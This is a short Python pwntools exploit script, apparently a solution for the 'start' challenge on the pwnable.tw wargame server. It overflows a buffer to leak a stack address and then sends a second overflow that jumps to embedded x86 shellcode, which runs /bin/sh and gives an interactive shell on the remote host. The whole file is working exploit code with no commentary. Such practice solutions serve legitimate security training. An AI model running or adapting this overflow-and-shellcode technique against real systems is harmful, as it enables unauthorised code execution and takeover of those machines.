#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['terminator','-x','bash','-c']

local = 0

if local:
	cn = process('./start')
	bin = ELF('./start')
else:
	cn = remote('chall.pwnable.tw', 10000)


def z(a=''):
	gdb.attach(cn,a)
	if a == '':
		raw_input()

cn.recv()
pay = 'a'*20+p32(0x08048087)
cn.send(pay)

data = u32(cn.recv()[:4])
stack = data+0x10
success('stack: '+hex(stack))

pay = 'a'*20+p32(stack+4)+"\x31\xc0\x50\x68\x2f\x2f\x73"\
                   "\x68\x68\x2f\x62\x69\x6e\x89"\
                   "\xe3\x89\xc1\x89\xc2\xb0\x0b"\
                   "\xcd\x80\x31\xc0\x40\xcd\x80"
cn.send(pay)

cn.interactive()
